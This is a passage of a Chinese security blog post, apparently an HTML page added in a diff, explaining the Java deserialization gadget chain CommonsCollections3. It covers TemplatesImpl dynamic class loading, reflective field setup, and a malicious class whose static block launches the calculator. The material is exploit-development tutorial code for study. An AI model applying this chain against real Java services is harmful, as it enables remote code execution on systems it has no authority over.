@@ -1,0 +1,737 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="CTF,Java,Web,JavaScript,Linux">
+    <meta name="description" content="记录一些奇奇怪怪乱七八糟的东西">
+    <meta name="author" content="y1zh3e7">
+    
+    <title>
+        
+            CommonsCollections3 |
+        
+        y1’s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.jpg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/logo.jpg","favicon":"/images/logo.jpg","avatar":"/images/avatar.jpg","font_size":"21px","font_family":"STHeiti","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/cover.jpg","description":"一只坐牢的web🐶 || 懂进攻知防守，先正向后逆向","font_color":"#FFFFFF","hitokoto":false},"scroll":{"progress_bar":true,"percent":true}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":true},"comment":{"enable":true,"use":"valine","valine":{"appid":"yCemvr5nGXrJlWRCN3SLWLLy-MdYXbMMI","appkey":"7gIuYJ9YQk94en6wRudankYd","server_urls":"https://ycemvr5n.api.lncldglobal.com","placeholder":"Hi speak something！"},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"center","copyright_info":false},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.0.0-rc1">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/logo.jpg">
+                </a>
+            
+            <a class="logo-title" href="/">
+               y1’s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">CommonsCollections3</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/avatar.jpg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">y1zh3e7</span>
+                            
+                                <span class="author-label">Lv1</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2023-05-20 16:37:42</span>
+        <span class="mobile">2023-05-20 16:37</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2023-05-20 16:38:59</span>
+    </span>
+    
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/WebSec/">WebSec</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Java反序列化</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>2.8k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>12 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <h1 id="CC1打不通时的另外一条链CC3"><a href="#CC1打不通时的另外一条链CC3" class="headerlink" title="CC1打不通时的另外一条链CC3"></a>CC1打不通时的另外一条链CC3</h1><p>在CC1和CC6中，我们最终弹计算器都是通过<code>Runtime.exec</code>进行调用，从CC3我们要介绍一种不通过Runtime来弹计算器的方法，也就是Java中常提到的动态类加载，动态类加载可以让我们通过一个路径来加载一个恶意类，如果这个恶意类在<code>静态代码块</code>或<code>构造代码块</code>中写入了恶意方法，那么我们就可以通过找一条链子来初始化这个类（一般在进行实例化时会对类进行初始化），从而达到代码块中的代码执行。</p>
+<p>ClassLoader中的defineClass最终实现了类的动态加载（后面还有一些过程但已经是依靠c来实现的了），在ClassLoader中可以看到一堆defineClass，我们查找用法，看一下哪个defineClass在别处被调用了，而且权限最好是default或者public，方便我们利用，最终锁定下面这个：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)</span><br><span class="line">        <span class="keyword">throws</span> ClassFormatError</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这个defineClass被调用的点在<code>com.sun.org.apache.xalan.internal.xsltc.trax</code>中的<code>TemplatesImpl.TransletClassLoader</code>下，也是一个defineClass：</p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143718657.png"></p>
+<p>这个defineClass又在当前类中被<code>defineTransletClasses</code>调用：</p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143601848.png"></p>
+<p><code>defineTransletClasses</code>同类下有三个被调用点，我们看一下哪个方法可以被我们利用：</p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143620851.png"></p>
+<p>第一个返回<code>_class</code>：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">synchronized</span> Class[] getTransletClasses() {</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">catch</span> (TransformerConfigurationException e) {</span><br><span class="line">            <span class="comment">// Falls through</span></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> _class;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
+
+<p>第二个返回了<code>_class</code>的下标：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">getTransletIndex</span><span class="params">()</span> {</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">catch</span> (TransformerConfigurationException e) {</span><br><span class="line">            <span class="comment">// Falls through</span></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> _transletIndex;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
+
+<p>第三个方法我们主要看newInstance这里，这个<code>_class[_transletIndex]</code>可控（通过上面找到的<code>defineTransletClasses</code>动态加载进来），如果我们让_class为我们所构造的恶意类并让它newInstance，那么就可以执行恶意类中的静态/构造代码块中的代码，所以我们接着找这个方法的调用点：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException {</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">            <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">            <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br></pre></td></tr></tbody></table></figure>
+
+<p>下一调用点还是在这个类中，我们找到newTransformer()这个方法：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">    {</span><br><span class="line">        TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">        transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">            _indentNumber, _tfactory);</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们来梳理一下到目前的调用链，很短也很方便：</p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143637167.png"></p>
+<p>我们先将payload写出来：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        templatesimpl.newTransformer();</span><br></pre></td></tr></tbody></table></figure>
+
+<p>写完啦 下班！（开个玩笑）逻辑上来说这两行代码确实是完整的调用链，我们接下来要做的就是对类内部的各种属性进行赋值：</p>
+<p><code>newTransformer</code>内不需要进行赋值操作，跟进到<code>getTransletInstance</code>中 ，类内没有对_name和_class进行赋值，如果想要触发<code>defineTransletClasses()</code>我们就需要让_name不为空，_class为空，直接不给_class赋值即可：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br></pre></td></tr></tbody></table></figure>
+
+<p>继续跟进到<code>defineTransletClasses</code>中 ，如果想要走到下面动态加载_class，我们这里要注意对_tfactory进行赋值，否则对一个空属性调用方法，会爆空指针异常：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br></pre></td></tr></tbody></table></figure>
+
+<p>上一步之后我们在对_class赋值这里可以看到是通过修改<code>_bytecodes</code>从而控制_class的值：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) {</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br></pre></td></tr></tbody></table></figure>
+
+<p>一共三个需要修改的值，TemplatesImpl类是可序列化的，所以我们可以直接通过反射修改这些值，看一下这几个值的类型:</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">String</span> <span class="variable">_name</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[][] _bytecodes = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">TransformerFactoryImpl</span> <span class="variable">_tfactory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>都是private属性，所以要用<code>setAccessible</code> 来修改访问权限，name是String类型，所以直接赋个字符串就行：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">tmp</span> <span class="operator">=</span> templatesimpl.getClass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">    nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    nameField.set(templatesimpl,<span class="string">"y1"</span>);</span><br></pre></td></tr></tbody></table></figure>
+
+<p>再看<code>_bytecodes</code>，一个二维数组，但我们在给_class赋值时defineClass接受的却是一个一维数组：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) {</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line"></span><br><span class="line">Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> {</span><br><span class="line">            <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br></pre></td></tr></tbody></table></figure>
+
+<p>所以我们给<code>_bytecodes</code> 赋值时可以将defineClass接收的一维数组放进_bytecodes这个二维数组中，这样在进行for循环遍历时就可以将这个一维数组遍历出来并传给defineClass，这个class需要我们在写好java源码后手动编译为class文件，最好把这个class文件复制到电脑上的别的地方再在这里使用（编译后的class文件一般在target下）：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">"/Users/y1zh3e7/Desktop/Test.class"</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = {code};</span><br><span class="line">        bytecodesField.set(templatesimpl,codes);</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Test.<span class="keyword">class</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> {</span><br><span class="line">    <span class="keyword">static</span>{</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"open -na Calculator"</span>); <span class="comment">//这里是mac弹计算器的命令</span></span><br><span class="line">        } <span class="keyword">catch</span> (IOException e) {                             <span class="comment">//win下还是calc</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后我们再来改_tfactory的值：</p>
+<p>这里要注意一下，被transient关键字修饰的属性是不参与序列化的，也就是说就算我们通过反射修改了它的值，反序列化后的二进制流这个属性的值也依旧是null，所以这里我们要用其他的方式赋值</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">TransformerFactoryImpl</span> <span class="variable">_tfactory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们在readObject中发现有对这些属性进行赋值的操作，_tfactory的值是一个TransformerFactoryImpl实例：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">_name = (String)gf.get(<span class="string">"_name"</span>, <span class="literal">null</span>);</span><br><span class="line">   <span class="comment">//以下几行代码对序列化流中的属性读取它们的值，如果读不到值那么将它的值设为默认值（第二个参数）    </span></span><br><span class="line">			  _bytecodes = (<span class="type">byte</span>[][])gf.get(<span class="string">"_bytecodes"</span>, <span class="literal">null</span>);</span><br><span class="line">        _class = (Class[])gf.get(<span class="string">"_class"</span>, <span class="literal">null</span>);</span><br><span class="line">        _transletIndex = gf.get(<span class="string">"_transletIndex"</span>, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        _outputProperties = (Properties)gf.get(<span class="string">"_outputProperties"</span>, <span class="literal">null</span>);</span><br><span class="line">        _indentNumber = gf.get(<span class="string">"_indentNumber"</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is.readBoolean()) {</span><br><span class="line">            _uriResolver = (URIResolver) is.readObject();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        _tfactory = <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>();</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们先不进行序列化和反序列化，我们先用反射修改_tfactory的值，看看能不能弹计算器（这里我们并没有进行序列化和反序列化，所以其实就是用反射修改了个值，所以是可以修改成功的）：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tmp</span> <span class="operator">=</span> templatesimpl.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templatesimpl,<span class="string">"y1"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">"/Users/y1zh3e7/Desktop/Test.class"</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = {code};</span><br><span class="line">        bytecodesField.set(templatesimpl,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryfield</span> <span class="operator">=</span> tmp.getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">        tfactoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryfield.set(templatesimpl,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        templatesimpl.newTransformer();</span><br></pre></td></tr></tbody></table></figure>
+
+<p>没有弹出来计算器，爆了空指针异常，通过调试发现在_class成功加载类后，是这里抛出了异常：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"><span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) {</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                }</span><br><span class="line">                <span class="keyword">else</span> {</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) {</span><br><span class="line">                ErrorMsg err= <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">            }</span><br></pre></td></tr></tbody></table></figure>
+
+<p>第一个if检查_class的父类是否叫<code>ABSTRACT_TRANSLET</code> ，如果没有进入到if里面那么else中的_auxClasses为空，就会抛空指针，并且下面第二个if中也会抛异常，为了避免这两个抛异常的点，我们需要将_class加载的恶意类继承名为<code>ABSTRACT_TRANSLET</code> 的父类：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">ABSTRACT_TRANSLET</span></span><br><span class="line">        <span class="operator">=</span> <span class="string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>修改恶意类，继承的父类中有两个抽象方法需要进行重写：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>{</span><br><span class="line">    <span class="keyword">static</span>{</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"open -na Calculator"</span>);</span><br><span class="line">        } <span class="keyword">catch</span> (IOException e) {</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException {</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException {</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
